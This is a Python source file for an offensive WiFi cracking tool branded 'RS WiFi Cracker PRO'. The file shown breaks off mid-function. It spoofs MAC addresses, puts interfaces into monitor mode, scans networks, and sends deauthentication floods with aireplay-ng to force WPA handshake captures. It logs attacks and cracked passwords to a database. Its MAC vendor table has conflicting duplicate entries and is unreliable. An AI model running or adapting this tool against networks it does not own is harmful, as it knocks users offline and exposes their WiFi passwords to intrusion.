#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RS WiFi Cracker PRO v4.0.1 - Ultimate Edition
T3rmuxk1ng Private Release
Production Ready - Fixed Build
"""

import os
import sys
import re
import json
import time
import random
import hashlib
import socket
import struct
import signal
import threading
import subprocess
import platform
import shutil
import logging
import argparse
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from collections import defaultdict, Counter
from datetime import datetime  # FIXED: Correct import
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps, lru_cache
import sqlite3
import csv
import math

# Version info
VERSION = "4.0.1"
AUTHOR = "T3rmuxk1ng"
RELEASE_TYPE = "Private Release"

# ===================== CONFIGURATION =====================

@dataclass
class Config:
    """Configuration settings"""
    app_name: str = "RS WiFi Cracker PRO"
    version: str = VERSION
    author: str = AUTHOR
    
    # Paths
    install_dir: str = "/opt/rs-wifi-pro-v4"
    log_dir: str = "/var/log/rs-wifi-pro"
    capture_dir: str = "/tmp/rs-wifi-captures"
    wordlist_dir: str = "/usr/share/wordlists/rs-wordlists"
    report_dir: str = "/tmp/rs-wifi-reports"
    
    # Database
    db_path: str = "/var/lib/rs-wifi-pro/sessions.db"
    
    # Timeouts
    scan_timeout: int = 30
    handshake_timeout: int = 300
    crack_timeout: int = 3600
    
    # Display
    color_output: bool = True
    verbose: bool = False
    debug: bool = False
    
    # Network
    default_channel: int = 1
    max_retries: int = 3
    
    def __post_init__(self):
        for dir_path in [self.log_dir, self.capture_dir, self.wordlist_dir, 
                         self.report_dir, os.path.dirname(self.db_path)]:
            os.makedirs(dir_path, exist_ok=True)


# ===================== COLOR UTILITIES =====================

class Colors:
    """ANSI Color codes"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'


def colorize(text: str, color: str, bold: bool = False) -> str:
    """Apply color to text"""
    if not sys.stdout.isatty():
        return text
    prefix = Colors.BOLD if bold else ''
    return f"{prefix}{color}{text}{Colors.RESET}"


def print_banner():
    """Print application banner"""
    banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗
║     ██████╗ ██████╗ ███████╗    █████╗ ██╗     ██╗   ██╗ █████╗ ███████╗ ║
║     ██╔══██╗██╔══██╗██╔════╝   ██╔══██╗██║     ██║   ██║██╔══██╗██╔════╝ ║
║     ██████╔╝██████╔╝█████╗     ███████║██║     ██║   ██║███████║███████╗ ║
║     ██╔══██╗██╔══██╗██╔══╝     ██╔══██║██║     ╚██╗ ██╔╝██╔══██║╚════██║ ║
║     ██║  ██║██████╔╝███████╗   ██║  ██║███████╗ ╚████╔╝ ██║  ██║███████║ ║
║     ╚═╝  ╚═╝╚═════╝ ╚══════╝   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝ ║
║                     PRO v{VERSION} - ULTIMATE EDITION                        ║
║                        T3rmuxk1ng Private Release                       ║
║                      Production Ready - Fixed Build                     ║
╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


# ===================== LOGGING =====================

class Logger:
    """Advanced logging system"""
    
    def __init__(self, name: str = "RS-WiFi-Pro", log_dir: str = "/var/log/rs-wifi-pro"):
        self.name = name
        self.log_dir = log_dir
        os.makedirs(log_dir, exist_ok=True)
        
        self.log_file = os.path.join(log_dir, f"rs_wifi_pro_{datetime.now().strftime('%Y%m%d')}.log")
        
        # Setup logging
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)
        
        # File handler
        fh = logging.FileHandler(self.log_file)
        fh.setLevel(logging.DEBUG)
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)
        
        if not self.logger.handlers:
            self.logger.addHandler(fh)
            self.logger.addHandler(ch)
    
    def info(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{timestamp} {Colors.GREEN}[INFO]{Colors.RESET} ✓ {msg}")
        self.logger.info(msg)
    
    def warning(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{timestamp} {Colors.YELLOW}[WARN]{Colors.RESET} ⚠ {msg}")
        self.logger.warning(msg)
    
    def error(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{timestamp} {Colors.RED}[ERROR]{Colors.RESET} ✗ {msg}")
        self.logger.error(msg)
    
    def debug(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{timestamp} {Colors.DIM}[DEBUG]{Colors.RESET} {msg}")
        self.logger.debug(msg)
    
    def success(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{timestamp} {Colors.GREEN}[SUCCESS]{Colors.RESET} ★ {msg}")
        self.logger.info(f"SUCCESS: {msg}")
    
    def progress(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{timestamp} {Colors.CYAN}[PROGRESS]{Colors.RESET} ◆ {msg}")


# ===================== ERROR HANDLING =====================

class ErrorHandler:
    """Centralized error handling"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.error_count = 0
        self.errors: List[Dict] = []
    
    def handle(self, error: Exception, context: str = "", exit_on_error: bool = False):
        """Handle an exception"""
        self.error_count += 1
        
        error_info = {
            'type': type(error).__name__,
            'message': str(error),
            'context': context,
            'timestamp': datetime.now().isoformat()  # FIXED: Now correct
        }
        self.errors.append(error_info)
        
        self.logger.error(f"{context}: {type(error).__name__} - {str(error)}")
        
        if exit_on_error:
            self.logger.error("Fatal error encountered. Exiting...")
            sys.exit(1)
        
        return error_info
    
    def get_summary(self) -> Dict:
        """Get error summary"""
        return {
            'total_errors': self.error_count,
            'errors': self.errors
        }


# ===================== DATA TYPES =====================

class SecurityType(Enum):
    """WiFi security types"""
    OPEN = auto()
    WEP = auto()
    WPA = auto()
    WPA2 = auto()
    WPA3 = auto()
    WPA_WPA2 = auto()
    UNKNOWN = auto()


class NetworkMode(Enum):
    """Network modes"""
    MANAGED = "managed"
    MONITOR = "monitor"
    MASTER = "master"
    ADHOC = "adhoc"
    MESH = "mesh"


@dataclass
class WiFiNetwork:
    """WiFi network data"""
    bssid: str
    essid: str
    channel: int
    power: int
    security: SecurityType
    cipher: str = ""
    auth: str = ""
    clients: int = 0
    wps: bool = False
    wps_locked: bool = False
    pmkid: bool = False
    handshake_captured: bool = False
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())  # FIXED
    last_seen: str = field(default_factory=lambda: datetime.now().isoformat())   # FIXED
    
    def to_dict(self) -> Dict:
        return {
            'bssid': self.bssid,
            'essid': self.essid,
            'channel': self.channel,
            'power': self.power,
            'security': self.security.name,
            'cipher': self.cipher,
            'auth': self.auth,
            'clients': self.clients,
            'wps': self.wps,
            'wps_locked': self.wps_locked,
            'pmkid': self.pmkid,
            'handshake_captured': self.handshake_captured,
            'first_seen': self.first_seen,
            'last_seen': self.last_seen
        }


@dataclass
class WiFiClient:
    """WiFi client data"""
    mac: str
    bssid: str
    power: int
    packets: int
    channel: int = 0
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())  # FIXED
    last_seen: str = field(default_factory=lambda: datetime.now().isoformat())   # FIXED
    
    def to_dict(self) -> Dict:
        return {
            'mac': self.mac,
            'bssid': self.bssid,
            'power': self.power,
            'packets': self.packets,
            'channel': self.channel,
            'first_seen': self.first_seen,
            'last_seen': self.last_seen
        }


@dataclass
class HandshakeCapture:
    """Handshake capture data"""
    bssid: str
    essid: str
    capture_file: str
    captured_at: str = field(default_factory=lambda: datetime.now().isoformat())  # FIXED
    cracked: bool = False
    password: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'bssid': self.bssid,
            'essid': self.essid,
            'capture_file': self.capture_file,
            'captured_at': self.captured_at,
            'cracked': self.cracked,
            'password': self.password
        }


@dataclass
class Interface:
    """Network interface data"""
    name: str
    mac: str
    mode: str = "managed"
    status: str = "down"
    channel: int = 0
    vendor: str = "Unknown"
    driver: str = ""
    phy: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'name': self.name,
            'mac': self.mac,
            'mode': self.mode,
            'status': self.status,
            'channel': self.channel,
            'vendor': self.vendor,
            'driver': self.driver,
            'phy': self.phy
        }


# ===================== DATABASE =====================

class Database:
    """SQLite database handler"""
    
    def __init__(self, db_path: str = "/var/lib/rs-wifi-pro/sessions.db"):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self.conn = None
        self._connect()
        self._create_tables()
    
    def _connect(self):
        """Connect to database"""
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
    
    def _create_tables(self):
        """Create database tables"""
        cursor = self.conn.cursor()
        
        # Sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                interface TEXT,
                start_time TEXT,
                end_time TEXT,
                networks_scanned INTEGER DEFAULT 0,
                handshakes_captured INTEGER DEFAULT 0,
                passwords_cracked INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Networks table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS networks (
                bssid TEXT PRIMARY KEY,
                essid TEXT,
                channel INTEGER,
                security TEXT,
                power INTEGER,
                wps INTEGER DEFAULT 0,
                first_seen TEXT,
                last_seen TEXT,
                handshake_captured INTEGER DEFAULT 0,
                password TEXT
            )
        ''')
        
        # Clients table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                mac TEXT PRIMARY KEY,
                bssid TEXT,
                power INTEGER,
                packets INTEGER,
                first_seen TEXT,
                last_seen TEXT,
                FOREIGN KEY (bssid) REFERENCES networks(bssid)
            )
        ''')
        
        # Handshakes table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS handshakes (
                id TEXT PRIMARY KEY,
                bssid TEXT,
                essid TEXT,
                capture_file TEXT,
                captured_at TEXT,
                cracked INTEGER DEFAULT 0,
                password TEXT,
                FOREIGN KEY (bssid) REFERENCES networks(bssid)
            )
        ''')
        
        # Attacks table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id TEXT PRIMARY KEY,
                session_id TEXT,
                attack_type TEXT,
                target TEXT,
                start_time TEXT,
                end_time TEXT,
                status TEXT,
                result TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
        ''')
        
        self.conn.commit()
    
    def start_session(self, interface: str) -> str:
        """Start a new session"""
        session_id = hashlib.md5(f"{interface}{datetime.now().isoformat()}".encode()).hexdigest()[:12]  # FIXED
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO sessions (id, interface, start_time, status)
            VALUES (?, ?, ?, ?)
        ''', (session_id, interface, datetime.now().isoformat(), 'active'))  # FIXED
        self.conn.commit()
        return session_id
    
    def end_session(self, session_id: str, stats: Dict):
        """End a session"""
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE sessions 
            SET end_time = ?, networks_scanned = ?, handshakes_captured = ?,
                passwords_cracked = ?, status = 'completed'
            WHERE id = ?
        ''', (datetime.now().isoformat(), stats.get('networks', 0),  # FIXED
              stats.get('handshakes', 0), stats.get('cracked', 0), session_id))
        self.conn.commit()
    
    def save_network(self, network: WiFiNetwork):
        """Save network to database"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO networks 
            (bssid, essid, channel, security, power, wps, first_seen, last_seen, handshake_captured, password)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (network.bssid, network.essid, network.channel, network.security.name,
              network.power, int(network.wps), network.first_seen, network.last_seen,
              int(network.handshake_captured), ""))
        self.conn.commit()
    
    def save_handshake(self, handshake: HandshakeCapture) -> str:
        """Save handshake to database"""
        hs_id = hashlib.md5(f"{handshake.bssid}{datetime.now().isoformat()}".encode()).hexdigest()[:12]  # FIXED
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO handshakes (id, bssid, essid, capture_file, captured_at, cracked, password)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (hs_id, handshake.bssid, handshake.essid, handshake.capture_file,
              handshake.captured_at, int(handshake.cracked), handshake.password))
        self.conn.commit()
        return hs_id
    
    def update_handshake_cracked(self, bssid: str, password: str):
        """Update handshake as cracked"""
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE handshakes SET cracked = 1, password = ? WHERE bssid = ?
        ''', (password, bssid))
        cursor.execute('''
            UPDATE networks SET handshake_captured = 1, password = ? WHERE bssid = ?
        ''', (password, bssid))
        self.conn.commit()
    
    def get_networks(self) -> List[Dict]:
        """Get all networks"""
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM networks ORDER BY power DESC')
        return [dict(row) for row in cursor.fetchall()]
    
    def get_handshakes(self) -> List[Dict]:
        """Get all handshakes"""
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM handshakes ORDER BY captured_at DESC')
        return [dict(row) for row in cursor.fetchall()]
    
    def get_sessions(self) -> List[Dict]:
        """Get all sessions"""
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM sessions ORDER BY start_time DESC')
        return [dict(row) for row in cursor.fetchall()]
    
    def log_attack(self, session_id: str, attack_type: str, target: str, 
                   status: str, result: str = ""):
        """Log an attack"""
        attack_id = hashlib.md5(f"{attack_type}{target}{datetime.now().isoformat()}".encode()).hexdigest()[:12]  # FIXED
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO attacks (id, session_id, attack_type, target, start_time, status, result)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (attack_id, session_id, attack_type, target, datetime.now().isoformat(), status, result))  # FIXED
        self.conn.commit()
    
    def close(self):
        """Close database connection"""
        if self.conn:
            self.conn.close()


# ===================== INTERFACE MANAGER =====================

class InterfaceManager:
    """Network interface management"""
    
    VENDOR_OUI = {
        '00:0A': 'Cisco',
        '00:0B': 'Cisco',
        '00:0C': 'Cisco',
        '00:0D': 'Cisco',
        '00:0E': 'Cisco',
        '00:0F': 'Cisco',
        '00:10': 'Cisco',
        '00:11': 'Cisco',
        '00:12': 'Cisco',
        '00:13': 'Cisco',
        '00:14': 'Cisco',
        '00:15': 'Cisco',
        '00:16': 'Cisco',
        '00:17': 'Cisco',
        '00:18': 'Cisco',
        '00:19': 'Cisco',
        '00:1A': 'Cisco',
        '00:1B': 'Cisco',
        '00:1C': 'Cisco',
        '00:1D': 'Cisco',
        '00:50': 'Intel',
        '00:1E': 'Intel',
        '00:1F': 'Intel',
        '00:22': 'Intel',
        '00:23': 'Intel',
        '00:24': 'Intel',
        '00:25': 'Intel',
        '00:26': 'Intel',
        '00:27': 'Intel',
        '00:03': 'Intel',
        '00:04': 'Intel',
        '00:05': 'Intel',
        '00:02': 'Intel',
        '00:01': 'Intel',
        '00:00': 'Intel',
        'DC:A6': 'Raspberry Pi',
        'B8:27': 'Raspberry Pi',
        '28:2E': 'Xiaomi',
        '34:CE': 'Xiaomi',
        '4C:66': 'Xiaomi',
        '50:EC': 'Xiaomi',
        '74:A3': 'Xiaomi',
        '88:C3': 'Xiaomi',
        '9C:2E': 'Xiaomi',
        'AC:61': 'Xiaomi',
        'B0:E2': 'Xiaomi',
        'F8:A4': 'Xiaomi',
        'FC:64': 'Xiaomi',
        '00:26': 'Samsung',
        '00:27': 'Samsung',
        '00:1E': 'Samsung',
        '00:1D': 'Samsung',
        '00:1C': 'Samsung',
        '00:1B': 'Samsung',
        '00:1A': 'Samsung',
        '00:19': 'Samsung',
        '00:18': 'Samsung',
        '00:17': 'Samsung',
        '00:16': 'Samsung',
        '00:15': 'Samsung',
        '00:14': 'Samsung',
        '00:13': 'Samsung',
        '00:12': 'Samsung',
        '00:11': 'Samsung',
        'A4:83': 'Samsung',
        'A4:C3': 'Samsung',
        '08:00': 'Dell',
        '00:06': 'Dell',
        '00:08': 'Dell',
        '00:0B': 'Dell',
        '00:0C': 'Dell',
        '00:0D': 'Dell',
        '00:0E': 'Dell',
        '00:0F': 'Dell',
        '00:10': 'Dell',
        '00:DD': 'Dell',
        '00:01': 'Dell',
        '00:02': 'Dell',
        '00:03': 'Dell',
        '00:04': 'Dell',
        '00:05': 'Dell',
        'F0:1F': 'Dell',
        'F0:4D': 'Dell',
        'F0:F6': 'Dell',
    }
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.interfaces: List[Interface] = []
    
    def get_vendor(self, mac: str) -> str:
        """Get vendor from MAC address"""
        oui = mac[:8].upper()
        for prefix, vendor in self.VENDOR_OUI.items():
            if oui.startswith(prefix.upper()):
                return vendor
        return "Unknown"
    
    def list_interfaces(self) -> List[Interface]:
        """List wireless interfaces"""
        self.interfaces = []
        
        try:
            # Get interfaces from /sys/class/net
            net_path = "/sys/class/net"
            if os.path.exists(net_path):
                for iface in os.listdir(net_path):
                    # Check if it's wireless
                    wireless_path = os.path.join(net_path, iface, "wireless")
                    if os.path.exists(wireless_path):
                        interface = self._get_interface_info(iface)
                        if interface:
                            self.interfaces.append(interface)
        except Exception as e:
            self.logger.warning(f"Error listing interfaces: {e}")
        
        # Alternative: use iw command
        if not self.interfaces:
            try:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Interface' in line:
                            iface = line.split()[-1]
                            interface = self._get_interface_info(iface)
                            if interface:
                                self.interfaces.append(interface)
            except Exception as e:
                self.logger.warning(f"Error using iw: {e}")
        
        return self.interfaces
    
    def _get_interface_info(self, name: str) -> Optional[Interface]:
        """Get interface information"""
        try:
            # Get MAC address
            mac_path = f"/sys/class/net/{name}/address"
            mac = ""
            if os.path.exists(mac_path):
                with open(mac_path, 'r') as f:
                    mac = f.read().strip()
            
            # Get status
            operstate_path = f"/sys/class/net/{name}/operstate"
            status = "down"
            if os.path.exists(operstate_path):
                with open(operstate_path, 'r') as f:
                    status = f.read().strip()
            
            # Get mode using iw
            mode = "managed"
            try:
                result = subprocess.run(['iw', 'dev', name, 'info'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'type' in line:
                            mode = line.split()[-1]
                            break
            except:
                pass
            
            # Get driver
            driver = ""
            try:
                device_link = f"/sys/class/net/{name}/device/driver"
                if os.path.islink(device_link):
                    driver = os.path.basename(os.readlink(device_link))
            except:
                pass
            
            # Get PHY
            phy = ""
            try:
                result = subprocess.run(['iw', 'dev', name, 'info'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'wiphy' in line:
                            phy = f"phy{line.split()[-1]}"
                            break
            except:
                pass
            
            return Interface(
                name=name,
                mac=mac,
                mode=mode,
                status=status,
                vendor=self.get_vendor(mac),
                driver=driver,
                phy=phy
            )
        except Exception as e:
            self.logger.debug(f"Error getting interface info for {name}: {e}")
            return None
    
    def set_monitor_mode(self, interface: str) -> bool:
        """Set interface to monitor mode"""
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
            
            # Stop interface
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            
            # Set monitor mode
            subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], capture_output=True)
            
            # Start interface
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            
            # Verify
            result = subprocess.run(['iw', 'dev', interface, 'info'], 
                                  capture_output=True, text=True)
            if 'monitor' in result.stdout:
                self.logger.success(f"Set {interface} to monitor mode")
                return True
            else:
                # Try airmon-ng
                subprocess.run(['airmon-ng', 'start', interface], capture_output=True)
                time.sleep(2)
                return True
        except Exception as e:
            self.logger.error(f"Failed to set monitor mode: {e}")
            return False
    
    def set_managed_mode(self, interface: str) -> bool:
        """Set interface to managed mode"""
        try:
            # Stop interface
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            
            # Set managed mode
            subprocess.run(['iw', 'dev', interface, 'set', 'type', 'managed'], capture_output=True)
            
            # Start interface
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            
            # Restart NetworkManager
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
            
            self.logger.success(f"Set {interface} to managed mode")
            return True
        except Exception as e:
            self.logger.error(f"Failed to set managed mode: {e}")
            return False
    
    def set_channel(self, interface: str, channel: int) -> bool:
        """Set interface channel"""
        try:
            subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], 
                         capture_output=True)
            self.logger.debug(f"Set {interface} to channel {channel}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to set channel: {e}")
            return False
    
    def change_mac(self, interface: str, new_mac: str) -> bool:
        """Change MAC address"""
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            self.logger.success(f"Changed MAC to {new_mac}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to change MAC: {e}")
            return False
    
    def random_mac(self, interface: str) -> str:
        """Generate and set random MAC"""
        new_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        self.change_mac(interface, new_mac)
        return new_mac


# ===================== NETWORK SCANNER =====================

class NetworkScanner:
    """WiFi network scanner"""
    
    def __init__(self, interface: str, logger: Logger, db: Database):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.networks: Dict[str, WiFiNetwork] = {}
        self.clients: Dict[str, WiFiClient] = {}
        self.scanning = False
    
    def scan_airodump(self, channel: int = 0, timeout: int = 30) -> List[WiFiNetwork]:
        """Scan using airodump-ng"""
        self.logger.info(f"Starting airodump scan on {self.interface}...")
        
        capture_dir = "/tmp/rs-wifi-captures"
        os.makedirs(capture_dir, exist_ok=True)
        output_prefix = os.path.join(capture_dir, "scan")
        
        cmd = ['airodump-ng', self.interface, '-w', output_prefix, '--output-format', 'csv']
        if channel > 0:
            cmd.extend(['-c', str(channel)])
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(timeout)
            process.terminate()
            
            # Parse CSV
            csv_file = output_prefix + "-01.csv"
            if os.path.exists(csv_file):
                self._parse_airodump_csv(csv_file)
                self.logger.success(f"Found {len(self.networks)} networks")
        except Exception as e:
            self.logger.error(f"Scan failed: {e}")
        
        return list(self.networks.values())
    
    def _parse_airodump_csv(self, csv_file: str):
        """Parse airodump-ng CSV output"""
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find network section
            in_networks = False
            in_clients = False
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                if 'BSSID' in line and 'ESSID' in line:
                    in_networks = True
                    in_clients = False
                    continue
                
                if 'Station MAC' in line:
                    in_clients = True
                    in_networks = False
                    continue
                
                if in_networks:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        try:
                            bssid = parts[0]
                            power = int(parts[8]) if parts[8] else -100
                            channel = int(parts[3]) if parts[3] else 0
                            essid = parts[13] if len(parts) > 13 else ""
                            
                            security = SecurityType.UNKNOWN
                            if 'WPA3' in line:
                                security = SecurityType.WPA3
                            elif 'WPA2' in line:
                                security = SecurityType.WPA2
                            elif 'WPA' in line:
                                security = SecurityType.WPA
                            elif 'WEP' in line:
                                security = SecurityType.WEP
                            elif 'OPN' in line:
                                security = SecurityType.OPEN
                            
                            network = WiFiNetwork(
                                bssid=bssid,
                                essid=essid,
                                channel=channel,
                                power=power,
                                security=security
                            )
                            self.networks[bssid] = network
                            self.db.save_network(network)
                        except Exception as e:
                            self.logger.debug(f"Error parsing network: {e}")
        except Exception as e:
            self.logger.error(f"Error parsing CSV: {e}")
    
    def scan_iw(self) -> List[WiFiNetwork]:
        """Scan using iw command"""
        self.logger.info(f"Scanning with iw on {self.interface}...")
        
        try:
            result = subprocess.run(
                ['iw', 'dev', self.interface, 'scan'],
                capture_output=True, text=True, timeout=60
            )
            
            if result.returncode == 0:
                self._parse_iw_scan(result.stdout)
                self.logger.success(f"Found {len(self.networks)} networks")
        except Exception as e:
            self.logger.error(f"iw scan failed: {e}")
        
        return list(self.networks.values())
    
    def _parse_iw_scan(self, output: str):
        """Parse iw scan output"""
        current_bssid = None
        current_network = None
        
        for line in output.split('\n'):
            line = line.strip()
            
            if line.startswith('BSS'):
                if current_network and current_bssid:
                    self.networks[current_bssid] = current_network
                    self.db.save_network(current_network)
                
                parts = line.split()
                if len(parts) >= 2:
                    current_bssid = parts[1].split('(')[0]
                    current_network = WiFiNetwork(
                        bssid=current_bssid,
                        essid="",
                        channel=0,
                        power=-100,
                        security=SecurityType.UNKNOWN
                    )
            
            elif current_network:
                if 'SSID:' in line:
                    current_network.essid = line.split('SSID:')[1].strip()
                elif 'signal:' in line:
                    try:
                        sig = line.split('signal:')[1].strip().split()[0]
                        current_network.power = int(sig)
                    except:
                        pass
                elif 'DS Parameter set: channel' in line:
                    try:
                        current_network.channel = int(line.split('channel')[1].strip())
                    except:
                        pass
                elif 'RSN:' in line or 'WPA:' in line:
                    if 'WPA3' in line:
                        current_network.security = SecurityType.WPA3
                    elif 'WPA2' in line or 'RSN' in line:
                        current_network.security = SecurityType.WPA2
                    elif current_network.security == SecurityType.UNKNOWN:
                        current_network.security = SecurityType.WPA
        
        # Save last network
        if current_network and current_bssid:
            self.networks[current_bssid] = current_network
            self.db.save_network(current_network)
    
    def scan_nmcli(self) -> List[WiFiNetwork]:
        """Scan using nmcli"""
        self.logger.info("Scanning with nmcli...")
        
        try:
            result = subprocess.run(
                ['nmcli', '-t', '-f', 'SSID,BSSID,SIGNAL,SECURITY,CHAN', 'dev', 'wifi', 'list'],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    parts = line.split(':')
                    if len(parts) >= 5:
                        essid = parts[0] if parts[0] else "Hidden"
                        bssid = parts[1] if len(parts) > 1 else ""
                        signal = int(parts[2]) if parts[2].isdigit() else 0
                        security_str = parts[3] if len(parts) > 3 else ""
                        channel = int(parts[4]) if parts[4].isdigit() else 0
                        
                        security = SecurityType.UNKNOWN
                        if 'WPA3' in security_str:
                            security = SecurityType.WPA3
                        elif 'WPA2' in security_str:
                            security = SecurityType.WPA2
                        elif 'WPA' in security_str:
                            security = SecurityType.WPA
                        elif 'WEP' in security_str:
                            security = SecurityType.WEP
                        elif essid and not security_str:
                            security = SecurityType.OPEN
                        
                        if bssid:
                            network = WiFiNetwork(
                                bssid=bssid,
                                essid=essid,
                                channel=channel,
                                power=signal - 100,
                                security=security
                            )
                            self.networks[bssid] = network
                            self.db.save_network(network)
                
                self.logger.success(f"Found {len(self.networks)} networks")
        except Exception as e:
            self.logger.error(f"nmcli scan failed: {e}")
        
        return list(self.networks.values())
    
    def get_clients(self, bssid: str = None) -> List[WiFiClient]:
        """Get connected clients"""
        return list(self.clients.values()) if not bssid else [
            c for c in self.clients.values() if c.bssid == bssid
        ]
    
    def display_networks(self, networks: List[WiFiNetwork] = None):
        """Display networks in a table"""
        networks = networks or list(self.networks.values())
        
        print(f"\n{Colors.BOLD}{'#':<4} {'BSSID':<18} {'ESSID':<25} {'CH':<4} {'PWR':<6} {'Security':<12} {'WPS'}{Colors.RESET}")
        print("-" * 85)
        
        for i, net in enumerate(networks, 1):
            wps_str = f"{Colors.GREEN}Yes{Colors.RESET}" if net.wps else f"{Colors.DIM}No{Colors.RESET}"
            sec_color = Colors.RED if net.security in [SecurityType.OPEN, SecurityType.WEP] else Colors.GREEN
            essid = net.essid[:22] + "..." if len(net.essid) > 25 else net.essid
            
            print(f"{i:<4} {net.bssid:<18} {essid:<25} {net.channel:<4} {net.power:<6} "
                  f"{sec_color}{net.security.name:<12}{Colors.RESET} {wps_str}")


# ===================== HANDSHAKE CAPTURER =====================

class HandshakeCapturer:
    """WPA/WPA2 handshake capture"""
    
    def __init__(self, interface: str, logger: Logger, db: Database):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.capture_dir = "/tmp/rs-wifi-captures/handshakes"
        os.makedirs(self.capture_dir, exist_ok=True)
    
    def capture(self, bssid: str, channel: int, essid: str = "", 
                timeout: int = 300, deauth: bool = True) -> Optional[HandshakeCapture]:
        """Capture WPA/WPA2 handshake"""
        self.logger.info(f"Starting handshake capture for {bssid}...")
        
        # Set channel
        subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)], 
                      capture_output=True)
        
        output_file = os.path.join(self.capture_dir, f"{bssid.replace(':', '')}")
        
        # Start airodump-ng
        cmd = [
            'airodump-ng', self.interface,
            '-c', str(channel),
            '--bssid', bssid,
            '-w', output_file
        ]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Send deauth packets
        if deauth:
            time.sleep(2)
            for _ in range(5):
                subprocess.run([
                    'aireplay-ng', '-0', '5', '-a', bssid, self.interface
                ], capture_output=True)
                time.sleep(3)
                
                # Check for handshake
                cap_file = output_file + "-01.cap"
                if os.path.exists(cap_file):
                    result = subprocess.run(
                        ['aircrack-ng', cap_file],
